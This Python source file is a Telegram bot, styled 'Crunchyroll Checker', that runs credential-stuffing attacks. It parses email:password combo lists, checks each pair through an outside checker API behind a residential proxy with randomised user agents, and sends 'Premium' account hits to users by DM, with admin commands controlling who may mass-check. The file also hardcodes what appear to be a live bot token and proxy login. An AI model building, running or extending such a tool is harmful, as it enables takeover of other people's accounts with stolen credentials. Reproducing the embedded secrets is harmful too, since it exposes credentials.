import logging
import re
import requests
import asyncio
import json
from fake_useragent import UserAgent
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

TOKEN = "7768360748:AAFjgPr2IueOpZpujKgii--mtdSAsi3HxCo"
API = "https://crunchyroll-q9ix.onrender.com/check"
PROXY = "evo-pro.porterproxies.com:61236:PP_PGGKBC727X-country-US:atw43di2"
ADMIN_ID = 6177293322
ALLOWED_FILE = "allowed.json"
STARTERS_FILE = "starters.json"
CONCURRENT_CHECKS = 3
MAX_RETRIES = 3

logging.basicConfig(level=logging.INFO)

# --- Helpers for allowed users/groups ---
def load_allowed():
    try:
        with open(ALLOWED_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {"users": [], "groups": []}

def save_allowed(data):
    with open(ALLOWED_FILE, "w") as f:
        json.dump(data, f)

allowed = load_allowed()

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_allowed(user_id, chat_id):
    if is_admin(user_id):
        return True
    return user_id in allowed.get("users", []) or chat_id in allowed.get("groups", [])

# --- Helpers for "started bot in DM" users ---
def load_starters():
    try:
        with open(STARTERS_FILE, "r") as f:
            return set(json.load(f))
    except Exception:
        return set()

def save_starters(starters):
    with open(STARTERS_FILE, "w") as f:
        json.dump(list(starters), f)

starters = load_starters()

# --- Misc Helpers ---
def extract_email_pass(text):
    pattern = r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+):([^\s:]+)'
    return re.findall(pattern, text)

def check_account(email, password, retries=MAX_RETRIES):
    ua = UserAgent()
    for attempt in range(retries):
        headers = {
            "User-Agent": ua.random
        }
        params = {
            "email": f"{email}:{password}",
            "proxy": PROXY
        }
        try:
            r = requests.get(API, params=params, headers=headers, timeout=7)
            if r.status_code == 200:
                result = r.json()
                if "Error" in result.get("message", "") and attempt < retries - 1:
                    continue
                return result
            else:
                if attempt < retries - 1:
                    continue
                return {"message": "API Error"}
        except Exception as e:
            if attempt < retries - 1:
                continue
            return {"message": f"Error: {e}"}
    return {"message": "No response after retries."}

def progress_bar(current, total):
    percent = int((current / total) * 100) if total else 0
    bars = percent // 10
    return f"[{'■'*bars}{'□'*(10-bars)}] {percent}%"

START_MSG = (
    "<code>\n"
    " █ CRUNCHYROLL CHECKER █\n\n"
    "[ Step 1 ] /check - Check single account\n"
    "[ Step 2 ] /txt - Mass check via .txt\n</code>"

    "<a href=\"https://t.me/S4J4G\">‎ </a>"
)

user_state = {}
user_tasks = {}

def format_hit(email, password, resp):
    return (
        "✅ <b>Premium</b>\n"
        f"<b>Email</b>: <code>{email}</code>\n<b>Pass</b>: <code>{password}</code>\n"
        f"<b>Response:</b> <code> {resp.get('message','')}</code>"
    )

def format_dead(email, password, resp):
    return (
        "❌ <b>Dead</b>\n"
        f"<b>Email</b>:<code> {email}\nPass: {password}</code>\n"
        f"<b>Response:</b> <code> {resp.get('message','')}</code>"
    )

# --- Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Only mark as starter if in private chat
    if update.effective_chat.type == "private":
        starters.add(user_id)
        save_starters(starters)
    await update.message.reply_html(
        START_MSG,
        reply_to_message_id=update.message.message_id
    )

async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args or ":" not in " ".join(args):
        return await update.message.reply_text(
            "Usage: /check email:password",
            reply_to_message_id=update.message.message_id
        )
    emailpass = " ".join(args).strip()
    wait_msg = await update.message.reply_text(
        "Checking account, please wait...",
        reply_to_message_id=update.message.message_id
    )

    async def background_single_check():
        email, password = emailpass.split(":", 1)
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, check_account, email, password)
        msg = result.get("message", "No response.")
        if "Premium" in msg:
            res = format_hit(email, password, result)
        else:
            res = format_dead(email, password, result)
        await wait_msg.edit_text(res, parse_mode="HTML")

    asyncio.create_task(background_single_check())

async def txt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    is_private = update.effective_chat.type == "private"

    # Prevent duplicate mass checks per user
    if user_id in user_state and not user_state[user_id].get("stop", False):
        return await update.message.reply_text(
            "You already have a check running. Please stop it before starting another.",
            reply_to_message_id=update.message.message_id
        )

    # In allowed group: must have started bot in DM
    if not is_private and user_id not in starters:
        return await update.message.reply_text(
            f"Start me in private first (press /start in my DM: <a href='https://t.me/{(await context.bot.get_me()).username}'>link</a>) so I can DM you hits. Then use /txt again here.",
            parse_mode="HTML",
            reply_to_message_id=update.message.message_id
        )

    if not is_allowed(user_id, chat_id):
        return await update.message.reply_text(
            "You are not allowed to use mass checking. @S4J4G"
        )

    reply = update.message.reply_to_message
    if not reply or not reply.document or not reply.document.file_name.endswith(".txt"):
        return await update.message.reply_text("Reply to a .txt file with /txt")

    file = await context.bot.get_file(reply.document.file_id)
    content = (await file.download_as_bytearray()).decode(errors='ignore')
    combos = extract_email_pass(content)
    total = len(combos)
    if not total:
        return await update.message.reply_text("No valid combos found in file.")
    state = {"checked": 0, "hits": 0, "stop": False}
    user_state[user_id] = state

    def get_markup():
        return InlineKeyboardMarkup([[
            InlineKeyboardButton(f"Hits ({state['hits']})", callback_data="show_hits"),
            InlineKeyboardButton("Stop", callback_data="stop_check"),
        ]])

    # Progress note for group checkers
    progress_note = ""
    if not is_private:
        progress_note = "<b>Watch your DMs for hits!</b>\n"

    msg = await update.message.reply_text(
        progress_note +
        f"Crunchyroll Checking For {update.effective_user.username or update.effective_user.first_name}\n"
        f"Progress: {progress_bar(0, total)}\n"
        f"Total: {total} | Checked: 0",
        reply_markup=get_markup()
    )

    async def send_hit(email, password, resp):
        # Hits always to user DM if in group, else in same chat
        if not is_private:
            await context.bot.send_message(
                chat_id=user_id, text=format_hit(email, password, resp), parse_mode="HTML"
            )
        else:
            await context.bot.send_message(
                chat_id=chat_id, text=format_hit(email, password, resp), parse_mode="HTML"
            )

    async def check_and_report(idx, email, password, sem):
        async with sem:
            if state["stop"]:
                return
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, check_account, email, password)
            is_hit = "Premium" in result.get("message", "")
            state["checked"] += 1
            if is_hit:
                state["hits"] += 1
                await send_hit(email, password, result)
            # No else: ignore dead/errors
            await msg.edit_text(
                progress_note +
                f"Crunchyroll Checking For {update.effective_user.username or update.effective_user.first_name}\n"
                f"Progress: {progress_bar(state['checked'], total)}\n"
                f"Total: {total} | Checked: {state['checked']}\n"
                f"Hits: {state['hits']}",
                reply_markup=get_markup()
            )

    async def background_mass_check():
        sem = asyncio.Semaphore(CONCURRENT_CHECKS)
        tasks = []
        for idx, (email, password) in enumerate(combos):
            if state["stop"]:
                break
            tasks.append(asyncio.create_task(check_and_report(idx, email, password, sem)))
        await asyncio.gather(*tasks)
        if state["stop"]:
            await msg.edit_text(
                progress_note +
                f"Stopped by user!\nChecked: {state['checked']} | Hits: {state['hits']}"
            )
        else:
            await msg.edit_text(
                progress_note +
                f"Done! Checked {state['checked']} accounts.\n"
                f"Hits: {state['hits']}"
            )
        user_state.pop(user_id, None)
        user_tasks.pop(user_id, None)

    asyncio.create_task(background_mass_check())

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    if data == "stop_check":
        state = user_state.get(user_id)
        if state:
            state["stop"] = True
            await query.answer("Stopping...")
            await query.edit_message_text("Stopping checks. Please wait for current running checks to finish.")
    else:
        await query.answer("")

async def allow_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return await update.message.reply_text("You are not admin.")
    if not context.args:
        return await update.message.reply_text("Usage: /allow {user_id or group_id}")
    id_to_add = int(context.args[0])
    t = "users" if id_to_add > 0 else "groups"
    allowed[t].append(id_to_add)
    allowed[t] = list(set(allowed[t]))
    save_allowed(allowed)
    await update.message.reply_text(f"Allowed {id_to_add} for mass checking.")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return await update.message.reply_text("You are not admin.")
    s = f"Allowed Users: {allowed.get('users',[])}\nAllowed Groups: {allowed.get('groups',[])}"
    await update.message.reply_text(s)

async def remove_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return await update.message.reply_text("You are not admin.")
    if not context.args:
        return await update.message.reply_text("Usage: /remove {user_id or group_id}")
    id_to_remove = int(context.args[0])
    if id_to_remove in allowed.get("users", []):
        allowed["users"].remove(id_to_remove)
    if id_to_remove in allowed.get("groups", []):
        allowed["groups"].remove(id_to_remove)
    save_allowed(allowed)
    await update.message.reply_text(f"Removed {id_to_remove} from allowed.")

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send /check email:pass or reply to a .txt file with /txt to check Crunchyroll accounts!"
    )

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("txt", txt_cmd))
    app.add_handler(CommandHandler("allow", allow_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("remove", remove_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
    app.run_polling()

if __name__ == "__main__":
    main()
